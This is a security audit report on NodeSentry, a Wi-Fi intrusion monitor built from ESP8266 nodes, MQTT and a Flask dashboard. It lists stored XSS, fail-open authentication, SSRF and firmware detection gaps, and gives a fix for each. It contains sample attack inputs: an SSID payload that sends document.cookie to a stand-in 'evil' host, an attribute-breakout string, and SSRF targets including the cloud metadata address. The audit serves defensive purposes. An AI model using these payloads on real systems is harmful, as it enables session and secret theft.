<!--
This is the multi-agent code review that motivated the fixes on the
`security/audit-fixes` branch. File:line references point at the PRE-FIX code
(commit 3c97650); most items below are addressed in that branch's commits.
-->

## NodeSentry Security & Code Review

**Verdict:** Solid, well-architected hobby/portfolio project with genuinely nice touches (clean MQTT→SQLite→SocketIO pipeline, sensible firmware state machine, real rate limiting, WAL mode) — but it ships an unauthenticated-by-default web API and a textbook stored-XSS chain (attacker-controlled SSID → unescaped `innerHTML`) that together let anyone in Wi-Fi/network range fully compromise the dashboard, so it is **not safe to deploy as-is** until the XSS, open-by-default auth, and MQTT exposure are fixed.

### Executive summary

NodeSentry is a distributed Wi-Fi security monitor: ESP8266 nodes sniff 802.11 management frames and publish JSON over MQTT to a Flask/SocketIO backend that stores alerts in SQLite and renders a live dashboard. The architecture is clean and the firmware is thoughtfully written. The dominant problem is that the project trusts data it explicitly should not: SSIDs/MACs/node-IDs are attacker-controllable at the RF layer and over the anonymous-publish MQTT broker, yet they flow unescaped into the dashboard via `innerHTML` (stored XSS on every list page) and unvalidated into SQLite, notifier config, and outbound HTTP. Compounding this, API authentication is **optional and fails open** when `API_KEY` is unset, the broker is published to the host with `allow_anonymous true`, and the "production" deployment runs the Werkzeug dev server as root on `0.0.0.0`. The XSS, the open API, the exposed broker, and the API key being templated into every page form a single chain: a nearby attacker broadcasts a malicious SSID, it persists, executes JS in the operator's browser, and exfiltrates the key — collapsing the entire trust model.

The firmware findings are mostly honest-limitation issues (periodic sniff blind spot, queued-not-realtime alerts, channel-hop coverage gaps, detector bypasses) rather than memory-safety bugs — the one buffer concern (`publishAlert` snprintf chain) is latent, not currently exploitable. There is also meaningful documentation drift (README claims single-channel when the firmware hops; "API key required" when it's optional; broken setup steps) and a real ops bug that breaks `docker compose up` on a fresh clone (bind-mounting a non-existent DB file).

---

## Critical

### Area: Dashboard (stored XSS)

A single root cause spans four list-page renderers and two shared helpers: attacker-controlled `ssid` / `node` / `mac` / `vendor` / `type` are interpolated into `tbody.innerHTML` with **no HTML escaping**. The data arrives both from `/api/alerts` on load (stored) and live via `socket.on('alert')`, and persists in SQLite, so it re-fires on every dashboard visit. `shared.js` has no escape helper; `fmtMac` (`shared.js:3-8`) emits `mac`/`vendor` raw and `typeBadge` (`shared.js:22-24`) emits `type` raw into both a CSS class (attribute-context breakout) and the label.

| Sink | File:lines | Untrusted fields |
|---|---|---|
| Alerts table | `server/static/js/alerts.js:42-51` | `a.ssid` (48), `a.node` (45), `a.type`/`a.mac`/`a.vendor` via helpers |
| Dashboard Recent Alerts | `server/static/js/dashboard.js:113-122` | `a.ssid` (119), `a.node` (117), `a.type` |
| Probe Log | `server/static/js/probes.js:39-46` | `p.ssid` (44), `p.node` (42), `p.mac`/`p.vendor` |
| Devices table | `server/static/js/devices.js:51-61` | `d.ssids`/`d.nodes` joins (58-59), `d.alert_types` keys, `d.mac`/`d.vendor` |
| Shared helpers | `server/static/js/shared.js:3-24` | `fmtMac` mac/vendor, `typeBadge` type (class + text) |

**What's wrong:** An attacker broadcasts a beacon/probe with SSID `<img src=x onerror=fetch('//evil/'+document.cookie)>` (or publishes it directly to the anonymous broker). The firmware's `jsonEscape` only neutralizes JSON metacharacters — `<`, `>`, `=`, `(`, `)`, space all pass through — so the payload survives intact to `innerHTML`.

**Impact:** Any device within Wi-Fi range, with **zero** operator interaction beyond opening the dashboard, achieves persistent JS execution in the operator's authenticated session. The payload reads `API_KEY` (templated into every page as a JS global — see High findings), exfiltrates all alert/device data, rewrites notifier config (Telegram/Discord tokens, webhook) via `POST /api/config`, edits the whitelist to blind detection, and can pivot to the host.

**Fix (the load-bearing fix — output encoding):** Add one helper to `shared.js` and apply it at every interpolation of untrusted data:

```js
const escapeHtml = s => String(s ?? '').replace(/[&<>"']/g,
  c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

function fmtMac(mac, vendor){
  if(!mac) return '-';
  const m = escapeHtml(mac);
  return vendor ? `${m} <span style="color:var(--text-sub);font-size:10px">[${escapeHtml(vendor)}]</span>` : m;
}

const KNOWN_TYPES = new Set(['deauth','deauth_flood','probe','evil_twin','karma']);
function typeBadge(type){
  const t = String(type ?? '');
  const cls = KNOWN_TYPES.has(t) ? `type-${t}` : 'type-unknown';
  return `<span class="type-badge ${cls}">${escapeHtml(t.replace('_',' '))}</span>`;
}
```

Then wrap every remaining field at its interpolation site: `alerts.js:45,48`, `dashboard.js:117,119`, `probes.js:42,44`, and `devices.js:58-59` (`d.ssids.map(escapeHtml).join(', ')`, `d.nodes.map(escapeHtml).join(', ')`). The most robust long-term form is to build rows with `createElement`/`textContent` instead of `innerHTML`. **Defense in depth (ingress):** validate/normalize on the write path too (see the High MQTT-validation finding) so the DB and other consumers are protected.

---

## High

### Area: Authentication / exposure

#### API key authentication is optional and fails open when `API_KEY` is unset
**`server/main.py:37,41-50,329-331`** — `API_KEY = os.getenv("API_KEY", "")` defaults empty; `require_api_key` does `if not API_KEY: return f(...)`, bypassing auth entirely. Startup only *prints a warning* and proceeds to bind `0.0.0.0:5000`. The `.env.example` ships a placeholder (`change-me-to-a-strong-key`) that doesn't auto-disable open mode.
**Impact:** With `API_KEY` unset, every `/api` endpoint is fully unauthenticated — read all alerts/devices/nodes, read config (Telegram token + Discord webhook), overwrite config via `POST /api/config`, and trigger the SSRF-capable test endpoints. Anyone who can reach port 5000 owns the system with no credentials.
**Fix:** Fail closed. Refuse to start when no key is configured, or gate an explicit opt-in dev mode that binds to `127.0.0.1` only:
```python
host = "0.0.0.0"
if not API_KEY:
    if os.getenv("NODESENTRY_DEV_MODE") != "1":
        raise SystemExit("[FATAL] API_KEY not set; set it or NODESENTRY_DEV_MODE=1 (localhost-only).")
    host = "127.0.0.1"
    print("[!] DEV MODE: API auth disabled, binding to 127.0.0.1 only")
socketio.run(app, host=host, port=5000, debug=False)
```
Also blank out `API_KEY` in `.env.example` so copying it doesn't install a known placeholder.

#### API key rendered into HTML/JS globals, readable by any XSS
**`server/templates/base.html:71`** (and `index.html:13`, `api_docs.html:110`) — `const API_KEY = "{{ api_key }}";` is injected on every page via `ctx()` (`main.py:89-91`).
**Impact:** The single secret protecting all endpoints becomes a plain JS global on every page, so any of the stored-XSS sinks above exfiltrates it instantly, collapsing the XSS-to-full-API-compromise barrier even for out-of-band requests.
**Fix:** Stop emitting the key to the browser. Remove the `{{ api_key }}` lines and the `api_key` injection from `ctx()`/`api_docs`. Replace the JS-key model with a server-set, `HttpOnly`/`Secure`/`SameSite=Strict` session cookie that `require_api_key` also accepts for same-origin browser calls; add CSRF protection to the (now cookie-authenticated) `POST /api/config`. Keep the `X-API-Key` header for true server-to-server/CLI clients only.

#### Mosquitto: `allow_anonymous true` with port 1883 published to host
**`mosquitto/mosquitto.conf:1-2`** + **`docker-compose.yml:7-8`** — broker has no `password_file`/ACL and `"1883:1883"` exposes it on the host (`0.0.0.0`). The Python client subscribes `nodes/#` and feeds every message into `on_alert`/`on_stats`/`on_status` (`main.py:66-86`), persisting attacker-controlled `ssid`/`mac`/`node`/`type` and emitting them to all dashboard clients.
**Impact:** Any host on the LAN/VLAN (or anyone reachable if forwarded) can publish arbitrary JSON with zero credentials — forging/poisoning alerts, filling the DB, suppressing real alerts by flooding noise, and delivering the stored-XSS payloads.
**Fix (network):** Remove the `1883:1883` mapping so the broker is only reachable on the internal `nodesentry` network (the app connects via service name `mosquitto`). If external nodes must publish, set `allow_anonymous false`, add a `password_file` with per-node credentials, per-topic ACLs (`nodes/<id>/#` publish-only), and TLS on 8883.

### Area: Untrusted-input handling

#### Untrusted MQTT payload fields stored and emitted with no validation
**`server/main.py:66-72`** — `on_alert` takes the raw decoded MQTT JSON, stores it via `insert_alert`/`upsert_device`, and `socketio.emit("alert", payload)` straight to clients. `insert_alert` validates types only on the *read* path (`_validate_node`/`_validate_type` are used in `get_alerts`, not on insert), so arbitrary values persist unchecked. There is no `isinstance(payload, dict)` guard, so a bare JSON list/string spams handled errors.
**Impact:** Backs the stored XSS (raw `ssid`/`node` reach the browser), enables alert/device spoofing, and unbounded growth. The emit bypasses even read-path validation.
**Fix:** Before storing, require `isinstance(payload, dict)`; enforce `type` ∈ a known set; require `mac` to match `^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$` when present; reuse `_validate_node` and reject `None`; cap `ssid` length; coerce `rssi` to int; build a clean dict of only `{node,type,mac,ssid,rssi,timestamp}` and emit that, not the raw payload.

#### `POST /api/config` accepts arbitrary JSON with no schema validation
**`server/main.py:159-169`** — `data = request.get_json(silent=True)` is passed straight to `cfg_module.save(data)`, which `json.dump`s the raw body to `config.json`. No structure/type/key checks; `config.load()` merges with DEFAULTS but does **not** coerce types.
**Impact:** An attacker (trivially in open mode) can weaponize downstream consumers: write `thresholds.deauth_count` as a string → `len(...) >= 'x'` raises `TypeError` on every deauth alert (notifications die); set it huge → flood alerts silently disabled (monitor goes deaf); set `cooldown_seconds` massive → all evil_twin/karma alerts suppressed; rewrite `webhook_url`/`bot_token` → redirect victim metadata and enable SSRF (below).
**Fix:** Build a sanitized dict from only known keys with enforced types and clamped ranges (bool for `enabled`, str for tokens/URLs, int with `1..N` clamps for thresholds, `list[str]` for whitelist); reject with 400 on any violation; never persist the raw body. Treat mutating endpoints as privileged regardless of open mode.

#### SSRF via notifier `webhook_url` / `bot_token` (test endpoints + alert sends)
**`server/notifier.py:125,138-151,229-262`** + **`main.py:171-185`** — `_send_discord`/`test_discord` POST to `cfg.get("webhook_url")` with no validation; `_send_telegram`/`test_telegram` interpolate an unvalidated `token` into `https://api.telegram.org/bot{token}/...`. `POST /api/config/test/discord|telegram` immediately fire a server-side request to these.
**Impact:** In open mode this is unauthenticated SSRF — set `webhook_url` to `http://169.254.169.254/latest/meta-data/`, `http://localhost:1883`, or an internal admin panel, then call the test endpoint to make the server issue the request from inside the trust boundary. `requests.post` follows redirects by default; the reflected status is an oracle.
**Fix:** Validate destinations before sending: Discord must match `^https://(discord|discordapp)\.com/api/webhooks/`; Telegram token must match `^\d+:[A-Za-z0-9_-]{20,}$`. Defense in depth: resolve the host and reject loopback/private/link-local/reserved IPs; pass `allow_redirects=False` to every `requests.post`. Require auth on `/api/config/test/*` regardless of open mode.

#### Unescaped shared helpers `fmtMac`/`typeBadge` propagate XSS to every table
**`server/static/js/shared.js:3-24`** — covered by the Critical XSS root cause; called from `alerts.js`, `probes.js`, `devices.js`, `dashboard.js`. `typeBadge` interpolates `type` into a `class` attribute, allowing attribute-context breakout (`x" onmouseover=alert(1) y`).
**Fix:** As in the Critical fix — escape `mac`/`vendor` in `fmtMac`, and allow-list the `typeBadge` class suffix plus escape the label.

#### Stored XSS via node id in Nodes grid (Socket.IO stats/status trusted raw)
**`server/static/js/nodes.js:27-38`** — `◎ ${n.node}` (30) interpolated unescaped; `n.node` comes straight from MQTT via `socket.on('stats')`/`socket.on('node_status')` which the backend re-emits raw (`main.py:74-86`). Numeric stats (`uptime`, `free_heap`, …) are also interpolated raw and are attacker-controllable.
**Fix:** Escape `n.node` and coerce numeric stats with `Number()`. Defense in depth: validate node id server-side (`[A-Za-z0-9_-]{1,32}`) in `insert_stats`/`on_status`.

### Area: Docs (real-impact)

#### Firmware README "can't corrupt the payload" claim omits the unescaped-HTML sink
**`nodes/firmware/README.md:63-64`** — the claim that hand-built JSON means "attacker-controlled SSIDs can't corrupt the payload" is true for JSON *integrity* but misleads by omission: SSIDs are rendered as raw HTML (the Critical XSS). A reader assumes end-to-end sanitization that does not exist.
**Fix:** Fix the real sink (the XSS fix above); secondarily scope the claim to "JSON payload integrity" and note the dashboard must escape `ssid`/`mac` on render.

### Area: Ops / deployment

#### docker-compose bind-mounts a DB file that doesn't exist on a fresh clone
**`docker-compose.yml:26-28`** — `./server/nodesentry.db:/app/server/nodesentry.db` is bind-mounted as a file, but the path is absent at clone time and the README never creates it before `docker compose up -d`. Docker auto-creates the missing source as a **directory**, mounted over the DB path; `sqlite3.connect` then fails ("unable to open database file") and the app restart-loops (masked by `restart: unless-stopped`).
**Impact:** The README's "easiest way to run" produces a broken deployment and litters the host with a bogus `server/nodesentry.db/` directory that must be `rm -rf`'d.
**Fix:** Stop bind-mounting a not-yet-existing file. Point `DB_PATH` at a `./data` directory (or a named volume) and `os.makedirs(..., exist_ok=True)` in `init_db()`; mount `- ./data:/app/data`. Add `data/` to `.gitignore`. Stopgap: document `mkdir -p server && touch server/nodesentry.db` before first run.

---

## Medium

### Area: Deployment hardening

#### Production Docker runs Werkzeug dev server on `0.0.0.0` with `allow_unsafe_werkzeug=True`, as root, no HEALTHCHECK
**`server/main.py:331`** + Dockerfile (no `USER`, no `HEALTHCHECK`) — `socketio.run(..., host="0.0.0.0", allow_unsafe_werkzeug=True)` explicitly overrides Flask-SocketIO's refusal to run the single-threaded dev WSGI server in production, and the container runs as uid 0.
**Impact:** The dev server is not hardened for hostile traffic (trivial DoS by holding connections, poor concurrency) and is exposed on all interfaces processing attacker-influenced data; root means any RCE/path bug yields root in the container (with write access to bind-mounted host files); missing HEALTHCHECK hides a wedged-but-alive app.
**Fix:** Add `gunicorn` (deps use the threading async mode) and change the Dockerfile CMD to e.g. `gunicorn -w 1 --threads 8 -b 0.0.0.0:5000 --chdir server main:app` (or `gevent-websocket` worker if WebSocket transport is required); drop `allow_unsafe_werkzeug=True` and keep `socketio.run` only as a `__main__` dev fallback. Add a non-root `USER` and a `HEALTHCHECK`. Consider binding the published port to localhost in compose if external access isn't needed.

### Area: Secrets / info disclosure

#### GET `/api/config` returns secrets verbatim
**`server/main.py:153-157`** — `api_config_get` returns `cfg_module.load()` including `notifications.telegram.bot_token` and `notifications.discord.webhook_url`.
**Impact:** In open mode this is an unauthenticated leak of the Telegram bot token (= control of the bot) and Discord webhook (= post as the bot); with a key, it shares the same blast radius as any XSS.
**Fix:** Deep-copy and mask non-empty `bot_token`/`webhook_url` (e.g. `********`) before `jsonify`; in `api_config_post`, treat an incoming masked sentinel as "leave the stored value unchanged" by merging against the on-disk config rather than overwriting with the mask.

### Area: Detection robustness (firmware)

#### Sniffer disabled for the entire upload window — periodic ~25% detection blind spot
**`nodes/firmware/firmware.ino:639-713`** — every cycle the node sniffs ~45 s (`UPLOAD_INTERVAL_MS`), then `beginUpload()` does `wifi_promiscuous_enable(0)` and reconnects WiFi+MQTT; until `finishUpload()` re-enables promiscuous, no management frames are parsed. That CONNECTING+UPLOADING phase lasts up to `UPLOAD_WINDOW_MS = 15 s` (~25% of wall-clock).
**Impact:** A deauth flood / evil-twin burst / karma response timed inside the 15 s window is never seen; sub-15 s deauth bursts (routine) are invisible; ~1 in 4 of all frames are dropped.
**Fix:** Minimize and bound the deaf window: cache the WiFi association (only `begin()` if `status()!=WL_CONNECTED`), shrink `UPLOAD_WINDOW_MS` and the MQTT retry interval, and only leave monitor mode when the queue is non-empty (`if ((qHead != qTail || !uploadedStats) && now - lastUpload > UPLOAD_INTERVAL_MS) beginUpload();`). Document the residual periodic blind window in the README.

#### Karma detection trivially bypassed by one matching attacker beacon
**`nodes/firmware/firmware.ino:299-319,441-445,495-504`** — `checkKarma()` bails if `bssidBeacons(bssid, ssid)` is true, but `learnBeacon()` records *any* SSID seen in *any* beacon from that BSSID, unauthenticated. A MANA/karma attacker who also beacons the spoofed SSID from the same BSSID self-poisons `karmaTbl` and suppresses the alert.
**Impact:** Capable rogue APs (real `hostapd-mana` setups beacon the spoofed SSIDs) escape karma detection entirely — a false negative on the exact threat targeted.
**Fix:** Gate the suppression on the BSSID being a known-legit AP (`legitTbl`), not on its own self-asserted beacon record:
```c
static bool legitBeacons(const uint8_t* bssid, const char* ssid){
  for (int i=0;i<MAX_LEGIT;i++)
    if (legitTbl[i].used && macEqual(legitTbl[i].bssid,bssid) && strcmp(legitTbl[i].ssid,ssid)==0) return true;
  return false;
}
```
Use `if (legitBeacons(bssid, ssid)) return;` at line 444.

### Area: Performance (dashboard / firmware)

#### `upsert_device` grows `ssids`/`nodes` arrays unbounded from attacker SSIDs
**`server/database.py:240-280`** — every new SSID/node is appended to JSON arrays with no cap; the whole array is reloaded/mutated/re-serialized per alert (O(n) per insert, O(n²) over a flood). SSIDs are RF-/MQTT-attacker-controlled.
**Impact:** A single nearby attacker emitting probes with thousands of distinct SSIDs for one MAC balloons a device row to megabytes, amplifying memory/CPU/disk on every subsequent alert and bloating `/api/devices` — an unauthenticated storage-amplification/DoS primitive.
**Fix:** Clamp per-SSID length and cap the arrays as bounded most-recent windows: `ssid = ssid[:64]`, then `ssids = ssids[-32:]` / `nodes = nodes[-16:]` after append. Apply the SSID clamp on the insert path too; ideally lock down the broker.

### Area: Concurrency / reliability

#### Notifier worker has no error isolation; one malformed alert kills all notifications
**`server/notifier.py:154-168`** — the single `_notifier_worker` loop body is not wrapped in try/except. `_build_*_message` runs before the per-send try, so e.g. `time.localtime(ts)` on an attacker-supplied non-numeric/out-of-range `timestamp` propagates out of the worker, terminating the only consumer of `_notif_queue`. Items then pile to `maxsize=100` and `process()` silently drops every subsequent notification; nothing logs that the worker died.
**Impact:** A single crafted MQTT alert permanently kills notifications — the monitor goes deaf while appearing healthy.
**Fix:** Wrap the worker loop body in `try/except` with `task_done()` in `finally`, and coerce the timestamp where consumed: `ts = alert.get("timestamp"); if not isinstance(ts,(int,float)) or isinstance(ts,bool): ts = time.time()` in both message builders.

### Area: Docs (medium-impact)

#### README/api_docs/OpenAPI claim the API key is required, but auth is optional
**`README.md:247-249`** (and `main.py:213` global `security`) — docs say "All endpoints require an X-API-Key header"; reality is open-by-default when `API_KEY` is unset.
**Fix:** Correct the docs to state auth is enforced only when `API_KEY` is set, warn that `POST /api/config` is unauthenticated in open mode, and pair with the fail-closed startup change.

#### Firmware README "Configure" points to a non-existent `#define` block (config lives in `credentials.h`)
**`nodes/firmware/README.md:34-44`** — instructions say to edit a USER CONFIG `#define` block "at the top of firmware.ino", but `firmware.ino:27` does `#include "credentials.h"` and the repo ships `credentials.h.example` (never mentioned). The documented build fails with `credentials.h: No such file or directory`.
**Fix:** Rewrite to `cp credentials.h.example credentials.h` then edit `credentials.h`; remove the false "top of firmware.ino" claim and add the copy step to the Arduino IDE / PlatformIO instructions.

---

## Low

### Area: Security hardening

- **Non-constant-time API key comparison** — `server/main.py:46-48` uses `key != API_KEY`. Use `hmac.compare_digest(key or "", API_KEY)` (import `hmac`). Network jitter + the limiter make this hard to exploit, but it's a trivially-fixed secret-equality weakness.
- **Weak hardcoded default `SECRET_KEY`** — `server/main.py:19` falls back to `"change-me-in-production"`. Generate an ephemeral `os.urandom(32).hex()` when unset (warn that sessions won't persist) and never ship a literal constant; relevant the moment any signed-session feature is added.
- **HTML injection into Telegram messages** — `server/notifier.py:56-82,119-135` interpolates `ssid`/`mac`/`node`/`vendor` into an HTML message with `parse_mode=HTML`, unescaped. Add `import html` and `html.escape(...)` each value — neutralizes phishing-link injection and the malformed-HTML notification-suppression vector.
- **Secrets/untrusted payloads to stdout via `print()`** — `server/notifier.py:133,149` print `resp.text`; `mqtt_client.py:42/46/50` dump full untrusted payloads (log forging via embedded newlines/ANSI). Switch to `logging` with a control-char-stripping, truncating sanitizer.
- **CSV/Excel formula injection in exports** — `server/static/js/alerts.js:115-120` (and `devices.js:107-115`) use `JSON.stringify(cell)`, which doesn't neutralize leading `=`/`+`/`-`/`@`. An SSID like `=HYPERLINK(...)` executes when the operator opens the export. Add a `csvCell()` helper that prefixes formula-trigger cells with `'` and applies RFC-4180 quoting.

### Area: Correctness

- **`?type=deauth_flood` silently returns ALL alerts** — `server/database.py:81-84,129-156`. `deauth_flood` isn't in `VALID_TYPES`, so `_validate_type` returns `None`, the WHERE filter is dropped, and the full table is returned (an unauthenticated full-table read in open mode). Make `_validate_type` return a `"__no_match__"` sentinel for unknown non-empty types, and remove `deauth_flood` from the OpenAPI enum (`main.py:222`) since it's notification-only.
- **`deauth_flood` advertised as a stored type but never persisted** — `server/database.py:166-175,209-219` (`SEVERITY_SCORES` includes it; escalation lives only in `notifier.process`). Dashboards keying off it show an empty/zero category; the most dangerous event is stored as `deauth`/severity 6. Remove from `SEVERITY_SCORES` + OpenAPI enum, or persist it and add to `VALID_TYPES`.
- **`upsert_device` silently drops alerts with no MAC** — `server/database.py:242-244` no-ops without logging, desyncing `/api/devices` from the alert log. Log the skip, or bucket under a `"unknown"` sentinel like the existing node default.
- **Alerts can be published with `timestamp:0`** — `nodes/firmware/firmware.ino:172-175,531-532,742`. NTP rarely syncs because the node is off-channel most of the time, so events store as 1970, corrupting ordering/dedup/timeline. Make the server authoritative: stamp `payload["timestamp"] = int(time.time())` in `on_alert`/`on_stats`/`on_status` (also defends the attacker-controllable-timestamp trust issue). Optionally re-arm SNTP at each upload window.
- **`fmtTime`/`fmtDate` render epoch-1970 for missing/ms timestamps** — `server/static/js/shared.js:18-20` (and `devices.js`, `dashboard.js` bucketing). Guard non-finite/zero `ts` → dash, normalize ms vs s, and skip non-finite in `addToTimeline`.
- **Alert latency up to ~45 s + connect time** — `nodes/firmware/firmware.ino:384,402,435,457,569-575,677`. Queue only drains during the periodic upload phase, so worst-case end-to-end latency is ~50 s+, defeating "live" framing. Add an urgent-flush path: set a flag in `enqueue()` for `A_DEAUTH`/`A_EVILTWIN` and `if (urgentFlush || now - lastUpload > UPLOAD_INTERVAL_MS) beginUpload();`.
- **Channel-hop dwell (400 ms) misses slow deauth floods** — `nodes/firmware/firmware.ino:40-41,49-51,372-378,662-669`. With 13 channels a source is observed ~2×400 ms per 10 s window, so only floods faster than ~6-7 frames/s on one channel reliably trip `DEAUTH_THRESHOLD=5`. Document the rate floor; optionally widen `DEAUTH_WINDOW_MS`/lower threshold with a decaying counter, or extend dwell on a suspected channel.
- **Deauth window reset defeated by interleaving just under the edge** — `nodes/firmware/firmware.ino:372-385`. The reset-on-overflow (not a true sliding window) lets a 4-frames-per-~10 s attacker stay under threshold forever. Replace the hard reset with a leaky-bucket decay (or a ring buffer of the last N timestamps); fix the misleading "sliding window" comment.
- **millis() wraparound corrupts LRU eviction** — `nodes/firmware/firmware.ino:278-297,321-335` (and `242`, `360`). `findKarmaAP`/`recordProbe` pick victims by absolute `ts <` after `millis()` wraps (~49.7 days), evicting newest instead of oldest. Rank by unsigned age `(uint32_t)(now - ts)` everywhere; drop the `oldest = now + 1` seed.
- **`passCooldown` eviction is biased / not wrap-safe** — `nodes/firmware/firmware.ino:232-250`. The 32-slot table is shared across all alert types; probe churn can evict an in-window evil_twin/deauth cooldown, re-firing the alert. Prefer expired victims (wrap-safe `now - ts >= windowMs`), and give probe its own table.
- **`backfille_devices.py` never populates the device vendor column** — `backfille_devices.py:25-27`. The migration skips the `payload["vendor"] = get_vendor(...)` step that the live path does (`main.py:69`), so all historical devices get `vendor=NULL`. Enrich each row: `alert["vendor"] = get_vendor(alert.get("mac"))` before `upsert_device`.

### Area: Reliability / concurrency

- **Latent `publishAlert` snprintf-accumulation overflow** — `nodes/firmware/firmware.ino:530-556`. Intermediate `n += snprintf(...)` calls have no per-step bounds check; if `n` ever exceeds 512, `sizeof(body)-n` underflows to a huge `size_t` and `body+n` writes OOB. **Not exploitable today** (worst-case body ~362 B < 512), but the margin is invisible/load-bearing. Add `if (n < 0 || n >= (int)sizeof(body) - 2) return;` after each optional block, or factor into an `appendf` helper.
- **`node_status` dict mutated on MQTT thread, read on request threads without a lock** — `server/main.py:38,84,142`. Safe today only by GIL atomicity of single ops; a future `for k in node_status` while the MQTT thread inserts a new (attacker-publishable) key raises `RuntimeError`. Add a `threading.Lock`; snapshot under the lock in `api_nodes`.
- **`_deauth_tracker`/`_cooldowns` read-modify-write with no lock** — `server/notifier.py:171-187`. De-facto safe (single MQTT thread) but the non-atomic `min()`-then-`del` eviction breaks under any second producer (lost updates → missed floods, or `KeyError`). Guard with a module-level lock.
- **Thread-local SQLite connections never closed** — `server/database.py:11-30`. Each dev-server request thread opens a connection (+ PRAGMA setup) cached in thread-local, never closed → fd/handle leak under sustained traffic. Register `app.teardown_appcontext(close_conn)` to close per-request connections deterministically (MQTT/notifier threads are unaffected).
- **Non-atomic config save + silent DEFAULTS fallback** — `server/config.py:30-49,52-59`. `save()` truncates then streams; a crash mid-write leaves a truncated file, and `load()` silently falls back to DEFAULTS (transiently disabling whitelist/thresholds). Write to a temp file + `os.replace()`; deepcopy DEFAULTS to avoid aliasing; surface the corruption in the except.
- **`config._merge` shallow-copy aliases DEFAULTS** — `server/config.py:37-58`. Returned nested dicts share references with module-level DEFAULTS; an in-place mutation by a caller corrupts the template process-wide. Use `copy.deepcopy`.

### Area: Performance

- **`config.load()` runs 2-3× per alert (locked disk read + parse)** — `server/notifier.py:31,172,191,195`. Thread the single `cfg` through `_is_whitelisted(mac, cfg)` and `track_deauth(alert, cfg)` instead of re-loading. Attacker-driven alert volume otherwise contends `_lock` with the config API.
- **`devices.js` refetches `/api/devices?limit=500` on every `'alert'`** — `server/static/js/devices.js:134`. Under a flood (many alerts/sec) this is a self-inflicted request storm. Trailing-edge debounce to ≤1 fetch/3 s.
- **Unbounded client-side alert/probe arrays** — `server/static/js/alerts.js:144-148` (`probes.js`, `dashboard.js`). `push` with no cap leaks memory over a long monitoring session. Cap at e.g. 5000 via `splice`.

### Area: Code quality

- **Severity computed/stored twice** — `server/main.py:66-68` and `server/database.py:93-110`. `get_severity` runs in `on_alert` and again in `insert_alert`; `severity` is also absent from `known` so it lands in the `extra` JSON blob (duplicate storage, divergence hazard). Add `"severity"` to `known`; keep the `main.py:67` assignment (it feeds the emit).
- **Pagination listeners rebound per render; full re-render per alert** — `server/static/js/alerts.js:57-84` (and `probes.js`, `devices.js`). Bind Prev/Next once via delegation; coalesce socket-driven re-renders with `requestAnimationFrame`.
- **`shared.js` import-inside-function / duplicated helpers** — `database.py:241,284` use `import json as _json` despite a module-level import; `downloadFile`/`renderPagination`/`addNode`/pagination state are copy-pasted across `alerts.js`/`probes.js`/`devices.js` (the source of one-file-only fixes like the page-clamp). Hoist into `shared.js`.
- **Minor duplication / re-reads** — `ctx()` re-reads `API_KEY` from env (`main.py:89-91`); Telegram/Discord builders duplicate the field-extraction preamble (`notifier.py:56-97`); dashboard timeline bucketing duplicated (`dashboard.js:136-146`). Centralize each.

### Area: Docs

- **README claims connection pooling** — `README.md:271`, `database.py:10` — it's thread-local single connections, not a pool. Reword.
- **OpenAPI `/api/devices` limit lacks `maximum:500`** — `server/main.py:257` — silently capped by `_validate_limit`; clients can't discover the ceiling. Add `"maximum": 500`.
- **LWT "clean vs unexpected shutdown" claim unsupported** — `README.md:91` — firmware has no clean-shutdown status path, and routine upload-cycle disconnects suppress the LWT. Reword.
- **CONTRIBUTING references `config.example.json`** — `CONTRIBUTING.md:23,74` — actual file is `config.json.example`; the documented `cp` fails. Fix both occurrences.

---

## Info

- **Rate limiting keyed on `get_remote_address` with no ProxyFix** — `server/main.py:23-28`. Behind a proxy/NAT all clients collapse into one bucket; in-memory storage resets on restart. Make ProxyFix opt-in via `TRUSTED_PROXIES` (default 0 for the direct deployment to avoid an XFF-spoofing bypass); document the deployment model; use a shared store when scaling.
- **`socketio.emit()` from MQTT thread relies on auto-selected `threading` async_mode** — `server/main.py:72,76,86,30`. Works today (no eventlet/gevent pinned). Lock the contract in: `SocketIO(app, async_mode='threading', ...)` so adding an async worker later without `monkey.patch_all()` doesn't silently break cross-thread emits.
- **`COPY . .` + denylist `.dockerignore`** — `Dockerfile:8`. Fails open: `nodes/firmware/credentials.h` (gitignored, not in `.dockerignore`) would be baked into a shipped layer if present. Switch to an allowlist `COPY server/ ./server/`; add `nodes/firmware/`/`*.h` to `.dockerignore`.
- **Unpinned-by-hash dependencies** — `requirements.txt:3,23`. Future-dated pins look plausible and use canonical names (no obvious typosquats), but there are no `--require-hashes` constraints. Generate a hash-pinned lockfile in CI. Build hygiene only.
- **`mock_node.py` deauth payload omits `count`; never emits `deauth_flood`** — `nodes/mock_node.py:59-78`. Local testing under-covers the real schema. Add `count` and optionally a `deauth_flood` type.
- **Magic numbers for limits/page sizes scattered** — `server/main.py:124-151`, `database.py:74-79`, JS `PAGE_SIZE`/`?limit=500`. The 500 fetch limit and 500 `MAX_LIMIT` match only by coincidence. Centralize as named constants.
- **`get_devices` lacks the validation/filtering `get_alerts` has** — `server/database.py:283-307`. Duplicated envelope + ceiling-division. Factor a `_paginate` helper; filtering parity is a separate decision (devices aggregate JSON).
- **CONTRIBUTING misnames the migration script** — `CONTRIBUTING.md:70` (`backfill_devices.py` vs actual `backfille_devices.py`). Align the name.

> **Note on rejected findings:** verification correctly rejected the "attacker-controlled `extra.severity`" claim (`on_alert:67` overwrites severity *before* insert, so the stored `extra` reflects the server value), the pagination clamp "live bug" (no reachable path leaves `currentPage > totalPages`), the `mqtt.Client()` crash (paho 2.1.0 defaults `callback_api_version=VERSION1`; bare constructor only warns), and the `update_oui.py` "empty window" (WAL + single transaction make DELETE+INSERT atomic to readers). I concur with all four rejections. The one residual nit worth carrying is that `server/mqtt_client.py:25` defines VERSION2-shaped callback signatures against a default-VERSION1 client — a latent deprecation cleanup, not a crash.

---

## Strengths

The project does several things genuinely well — this is a strong portfolio piece:

- **Clean, legible architecture.** The MQTT → SQLite → SocketIO → dashboard pipeline is small, layered, and easy to follow; firmware, broker, backend, and frontend have clear responsibilities.
- **Thoughtful firmware design.** The promiscuous-sniff / offline-buffer / periodic-reconnect-flush state machine is the right pattern for a single-radio ESP8266, with bounded upload windows, an in-RAM ring queue, per-source cooldowns, and a retained-LWT online/offline signal. Hand-built JSON correctly protects *payload integrity* against adversarial SSIDs.
- **Real read-path input validation.** `_validate_limit`/`_validate_type`/`_validate_node` (`database.py`) sanitize query parameters and use parameterized SQL throughout — no SQL injection.
